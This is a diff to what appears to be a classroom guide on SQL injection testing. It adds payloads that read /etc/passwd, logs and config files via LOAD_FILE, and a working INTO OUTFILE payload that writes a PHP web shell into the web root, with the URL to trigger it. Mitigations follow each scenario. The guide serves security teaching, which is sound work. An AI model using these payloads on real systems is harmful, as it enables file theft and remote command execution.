@@ -311,17 +311,83 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['search'])) {
    UNION SELECT NULL, [column_name], NULL FROM [table_name] # 
    ```
 
-#### 7. **Read File from the Server**
-   **Objective**: Use the `LOAD_FILE` function to read a file from the server (if permitted by the database).
+### **Scenario 7: Read File from the Server (Using `LOAD_FILE`)**
+
+#### **Objective**:
+Test if an attacker can exploit SQL injection to read sensitive files from the server using the `LOAD_FILE()` function, assuming the server allows it.
+
+#### **Ethical Testing Steps**:
+
+1. **Confirm SQL Injection Vulnerability**:
+   - Ask your students to perform a **SQL injection test** by inputting simple payloads like `' OR 1=1 --` in form fields, URL parameters, or HTTP headers to check if the application is vulnerable to SQL injection.
+
+2. **Test to Read Sensitive Files**:
+   - If SQL injection is successful, the next step is to use the `LOAD_FILE()` function to try and read a file from the server. The following example attempts to read the **Linux system's `/etc/passwd`** file:
    ```sql
    UNION SELECT NULL, load_file('/path/to/file'), NULL #
-   ```
+   UNION SELECT NULL, load_file('/etc/passwd'), NULL #
+   UNION SELECT NULL, load_file('/var/log/apache2/access.log'), NULL #
 
-#### 8. **Write Data to a File on the Server**
-   **Objective**: Attempt to write content to a file on the server (using `OUTFILE`).
+   ```
+   3. **Try Reading Other Sensitive Files**:
+   - Students can also test reading other system files, such as:
+     - **Apache configuration**: `/etc/httpd/conf/httpd.conf`
+     - **Web application configuration**: `/var/www/html/config.php`
+     - **Logs**: `/var/log/apache2/access.log`
+
+   Example to read the Apache log file:
+   ```sql
+   UNION SELECT NULL, load_file('/var/log/apache2/access.log'), NULL #
+   ```
+   4. **Security Implications**:
+   - If successful, the attacker can expose sensitive system or application files that may contain user information, configuration data, or logs.
+   
+5. **Mitigation**:
+   - Ensure the **MySQL user** does not have **FILE** privileges unless necessary.
+   - Use MySQL’s `secure_file_priv` setting to restrict file access to trusted directories.
+   - Apply **input sanitization** and use **prepared statements** to prevent SQL injection.
+
+---
+
+### **Scenario 8: Write Data to a File on the Server (Using `OUTFILE`)**
+
+#### **Objective**:
+Test if an attacker can exploit SQL injection to write arbitrary data to a file on the server, which could be used to upload malicious files (like a web shell).
+
+#### **Ethical Testing Steps**:
+
+1. **Confirm SQL Injection Vulnerability**:
+   - As in the previous scenario, confirm SQL injection is possible through input fields, URL parameters, or headers. The goal is to verify that an attacker can inject malicious SQL queries into the application.
+
+2. **Test to Write Malicious Data to a File**:
+   - After confirming SQL injection, use the `OUTFILE` function to write malicious content to a file on the server. For example, to upload a **PHP web shell** (which allows remote command execution), you can use the following payload:
    ```sql
    UNION SELECT NULL, '[file_content]', NULL INTO OUTFILE '/path/to/output/file' #
+   UNION SELECT NULL, '<?php echo shell_exec($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/shell.php' #
+
    ```
+   - **Expected Outcome**:
+     - If successful, this will create a PHP file `shell.php` in the web server’s root directory.
+     - If this file is accessible via a browser (e.g., `http://localhost/shell.php?cmd=ls`), an attacker could execute arbitrary shell commands by passing them through the `cmd` parameter.
+
+3. **Test Other File Paths**:
+   - You can also try to write to different paths on the server to bypass restrictions or target other writable directories. Examples include:
+     - **Web directories**: `/var/www/html/`
+     - **Temporary directories**: `/tmp/`
+     - **Log files**: `/var/log/`
+
+   Example:
+   ```sql
+   UNION SELECT NULL, 'This is a test content', NULL INTO OUTFILE '/tmp/testfile.txt' #
+   ```
+
+4. **Security Implications**:
+   - Successful exploitation of this vulnerability can allow attackers to upload **web shells**, which can be used to execute arbitrary commands, escalate privileges, or control the server remotely.
+   
+5. **Mitigation**:
+   - Ensure that **MySQL users** have restricted **OUTFILE** privileges.
+   - Set appropriate file permissions on web directories to prevent writing by MySQL.
+   - Use **input validation** and **parameterized queries** to prevent SQL injection in the first place.
 
 #### 9. **Trigger Column Mismatch (Error Handling Test)**
    **Objective**: Test how the application handles column mismatch errors.
